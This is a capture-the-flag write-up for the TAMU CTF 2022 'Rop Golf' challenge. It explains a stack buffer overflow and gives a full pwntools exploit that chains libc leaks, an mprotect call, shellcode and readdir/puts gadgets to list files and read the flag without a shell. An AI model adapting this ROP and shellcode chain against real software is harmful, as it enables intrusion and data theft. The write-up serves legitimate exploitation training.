---
title: "[Pwn] Rop Golf [Tamu CTF 2022]"
date: 2022-04-17 16:55:00
---

# 0x0 Introduction

Author: sky

I keep on getting hacked by people using my shells! Now that I've deleted all the nonessential programs off my computer I should be safe... right?

The flag is in a *.txt file with a randomly generated name inside the same directory as the binary.

SNI: rop-golf

files: [rop_golf](rop_golf), [rop_golf.c](rop_golf.c), glibc 2.28

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

looking at the binary, the binary is contains a very simple buffer overflow vulnerability in funtion `vuln`. So in total, we have 72 -32 -8 = 32 bytes for buffer overflow.

We can do 4 rop operation.

However, the challenge server remove all the binary under `/bin`, `/usr/bin/`... So we are not able get a shell using `system('/bin/sh')`. 

So, In order to read the flag, we need to first manually do a `ls` to see what is flag name. Secondly, use `open`, `read`, `write` syscall to read the flag file and output to stdout.

Here is one way of manually doing `ls`, [https://www.gnu.org/software/libc/manual/html_node/Simple-Directory-Lister.html](https://www.gnu.org/software/libc/manual/html_node/Simple-Directory-Lister.html)

```
void vuln() {
    char buf[32];
    read(0, buf, 72);
}
```

Here is my solution

1. In the first rop chain, using puts to leak libc address and return back to `vuln`
2. In the second rop chain, use `pop rdx; ret`, `0x200`, `read addr`. So that I can write 0x200 more data on the stack and construct a larger rop chain. (I can do stack pivot here but im kind of lazy to do that)
3. In the third rop chain, which is now 0x200 bytes long. I first do `mprotect` on some memory pages so that i could put shellcode and gadgets on it. Then, i call `read` again to write shellcodes and essential gadgets into the memory page. Finally, I use rop chain to do a manually `ls` and read the flag.


# 0x3 Exploit

```
from pwn import *


class BinaryInfo:
    exe = "rop_golf_patched"
    libc = "libc.so.6"

    host = "rua.host.goes.here"
    port = 8000


# Set up pwntools for the correct architecture
exe = context.binary = ELF(BinaryInfo.exe)
exe_rop = ROP(exe)
if BinaryInfo.libc != "":
    libc = ELF(BinaryInfo.libc)
    libc_rop = ROP(libc)
else:
    libc = None
    libc_rop = None


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or BinaryInfo.host
port = int(args.PORT or BinaryInfo.port)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = remote("tamuctf.com", 443, ssl=True, sni="rop-golf")
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    No canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


def log_print(*msg):
    log.info(" ".join(map(str,msg)))


def int2byte(x: int):
    return x.to_bytes(exe.bytes, "little")


def wait_for_debugger(io):
    if args.LOCAL and input("debugger?") == "y\n":
        pid = util.proc.pidof(io)[0]
        log_print("The pid is: " + str(pid))
        util.proc.wait_for_debugger(pid)
        log_print("press enter to continue")

ret_addr = exe_rop.find_gadget(['ret'])[0]
pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]

io = start()
wait_for_debugger(io)

writable_addr = 0x0000000000404800

rop_1 = flat({
    32: b'00000000',
    32+8: [
        pop_rdi_ret_addr,
        exe.got['puts'],
        exe.sym["puts"],
        exe.sym["vuln"]
    ]
})

log_print("pop rdi ret",hex(pop_rdi_ret_addr))

io.sendafter(b"hi!\n",rop_1)
puts_addr = int.from_bytes(io.recvuntil(b'\n',drop=True),"little")
log_print("puts addr",hex(puts_addr))
libc_base_addr = puts_addr - libc.sym["puts"]
log_print("libc base addr",hex(libc_base_addr))

log_print(next(libc.search(b"%p\0")))
log_print("bin sh",hex(libc_base_addr + next(libc.search(b".\0"))))

log_print(libc.sym["opendir"])

log_print("mprotect",libc.sym["mprotect"])

pop_rsi_ret_addr = libc_base_addr + libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_ret_addr = libc_base_addr + libc_rop.find_gadget(['pop rdx', 'ret'])[0]
leave_ret_addr = libc_base_addr + libc_rop.find_gadget(['leave', 'ret'])[0]
mov_rdx_rax_ret_addr = libc_base_addr + 0x0000000000115dff
push_rdx_ret_addr = libc_base_addr + 0x0000000000117171
add_rax_1_ret_addr = libc_base_addr + 0x00000000000b4a00
add_rax_3_ret_addr = libc_base_addr + 0x00000000000b4a10

log_print("pop rsi ret",hex(pop_rsi_ret_addr))
log_print("pop rdx ret",hex(pop_rdx_ret_addr))
log_print("leave ret",hex(leave_ret_addr))

rop_2 = flat({
    32+8: [
        pop_rdx_ret_addr,
        0x200,
        exe.sym["read"],
    ]
})
io.send(rop_2)
shellcode_mov_rdi_rax_ret = asm(shellcraft.mov("rdi","rax"))+asm(shellcraft.ret())
mov_rdi_rax_ret_addr = writable_addr

shellcode_mov_r15_rdi_ret = asm(shellcraft.mov("r15","rdi"))+asm(shellcraft.ret())
mov_r15_rdi_ret_addr = mov_rdi_rax_ret_addr + len(shellcode_mov_rdi_rax_ret)

shellcode_mov_rdi_r15_ret = asm(shellcraft.mov("rdi","r15"))+asm(shellcraft.ret())
mov_rdi_r15_ret_addr = mov_r15_rdi_ret_addr + len(shellcode_mov_r15_rdi_ret)

shellcode_add_rax_19_ret = bytes.fromhex("4883c013c3")
add_rax_19_ret_addr = mov_rdi_r15_ret_addr + len(shellcode_mov_rdi_r15_ret)

shellcode_read_file = b''.join([
    asm(shellcraft.read(0, writable_addr+0x100, 100)),
    asm(shellcraft.open(writable_addr+0x100, 0)),
    asm(shellcraft.read('rax', writable_addr+0x100, 100)),
    asm(shellcraft.write(1, writable_addr+0x100, 100))])

read_file_addr = add_rax_19_ret_addr + len(shellcode_add_rax_19_ret)

flag_file_name = b"066A2462DEB399BA9183A91FC116914C.txt"

# log_print(hex(mov_rdi_rax_ret_addr),hex(mov_rdx_rdi_ret_addr),hex(mov_rdi_rdx_ret_addr))
final_shellcodes = shellcode_mov_rdi_rax_ret+shellcode_mov_r15_rdi_ret+shellcode_mov_rdi_r15_ret + shellcode_add_rax_19_ret + shellcode_read_file




rop_3 = flat({
    32+8: [
        b'AAAAAAAA',
        b'BBBBBBBB',
        b'CCCCCCCC',
        # make it rwx
        pop_rdi_ret_addr,
        0x0000000000404000,
        pop_rsi_ret_addr,
        0x1000,
        pop_rdx_ret_addr,
        1|2|4,
        libc_base_addr + libc.sym["mprotect"],
        # writing some gadget
        pop_rdi_ret_addr,
        0,
        pop_rsi_ret_addr,
        writable_addr,
        pop_rdx_ret_addr,
        0x100,
        exe.sym["read"],
        # print first filename
        pop_rdi_ret_addr,
        libc_base_addr + next(libc.search(b".\0")),
        libc_base_addr + libc.sym["opendir"],
        mov_rdi_rax_ret_addr,
        mov_r15_rdi_ret_addr,
        libc_base_addr + libc.sym["readdir"],
        add_rax_19_ret_addr,
        mov_rdi_rax_ret_addr,
        exe.sym["puts"],
        mov_rdi_r15_ret_addr,
        libc_base_addr + libc.sym["readdir"],
        add_rax_19_ret_addr,
        mov_rdi_rax_ret_addr,
        exe.sym["puts"],
        mov_rdi_r15_ret_addr,
        libc_base_addr + libc.sym["readdir"],
        add_rax_19_ret_addr,
        mov_rdi_rax_ret_addr,
        exe.sym["puts"],
        mov_rdi_r15_ret_addr,
        libc_base_addr + libc.sym["readdir"],
        add_rax_19_ret_addr,
        mov_rdi_rax_ret_addr,
        exe.sym["puts"],
        # mov_rdi_r15_ret_addr,
        # libc_base_addr + libc.sym["readdir"],
        # add_rax_19_ret_addr,
        # mov_rdi_rax_ret_addr,
        # exe.sym["puts"],
        read_file_addr
    ]
})
# input("asdf")
io.send(rop_3)
# input("writing gadgets")
io.send(final_shellcodes)
# input("lol")
log_print("filenames",io.recv())
io.send(flag_file_name)
log_print(io.recv())
```

# 0x4 Flag

gigem{r34lly_p1v071n6_7h47_574ck}
